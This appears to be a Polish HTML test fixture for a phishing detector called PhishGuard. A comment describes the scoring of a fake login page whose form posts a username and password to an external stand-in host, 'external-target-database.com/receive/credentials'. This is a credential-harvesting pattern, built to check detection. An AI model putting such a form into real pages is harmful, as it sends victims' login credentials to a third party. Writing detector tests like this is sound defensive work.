<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Analiza Celu Formularza</title>
  <!-- 
    OPIS SCENARIUSZA TESTOWEGO (EXTERNAL FORM ACTION):
    1. Formularz zawiera pole wprowadzania hasła (+15% kary).
    2. Cel formularza wskazuje na zupełnie inną domenę niż domena bieżąca strony (external form action: +35% kary).
    
    * Ten test pozwala wykazać, że PhishGuard wykrywa tzw. "credential harvesting",
      czyli sytuacje, w których strona-atrapa przesyła formularz logowania bezpośrednio 
      do serwera kontroli atakującego (Command and Control).
  -->
  <style>
    body {
      font-family: system-ui, sans-serif;
      background-color: #f1f5f9;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .box {
      background: #ffffff;
      padding: 24px;
      border-radius: 6px;
      border: 1px solid #cbd5e1;
      width: 320px;
    }
    .info {
      font-size: 12px;
      color: #64748b;
      margin-bottom: 16px;
    }
    input {
      width: 100%;
      padding: 8px;
      margin-bottom: 10px;
      border: 1px solid #cbd5e1;
      border-radius: 4px;
      box-sizing: border-box;
    }
    input[type="submit"] {
      background-color: #475569;
      color: white;
      border: none;
      cursor: pointer;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="box">
    <h3>Zewnętrzny Cel Logowania</h3>
    <p class="info">Ten formularz przesyła dane autoryzacyjne na odrębny serwer zewnętrzny.</p>
    
    <!-- Akcja wskazuje na zewnętrzną, inną domenę zabezpieczoną HTTPS -->
    <form action="https://external-target-database.com/receive/credentials" method="POST">
      <input type="text" placeholder="Identyfikator sieciowy" required>
      <input type="password" placeholder="Klucz dostępu (hasło)" required>
      <input type="submit" value="Autoryzuj połączenie">
    </form>
  </div>
</body>
</html>
